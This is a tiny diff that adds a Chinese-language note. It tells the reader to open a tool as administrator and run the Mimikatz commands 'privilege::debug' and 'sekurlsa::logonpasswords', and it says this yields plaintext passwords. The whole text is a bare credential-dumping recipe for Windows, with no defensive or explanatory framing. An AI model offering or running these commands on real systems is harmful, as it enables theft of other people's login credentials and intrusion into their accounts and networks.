@@ -1,0 +1,6 @@
+以管理员身份打开
+如果执行：
+privilege::debug
+
+sekurlsa::logonpasswords
+将得到明文密码
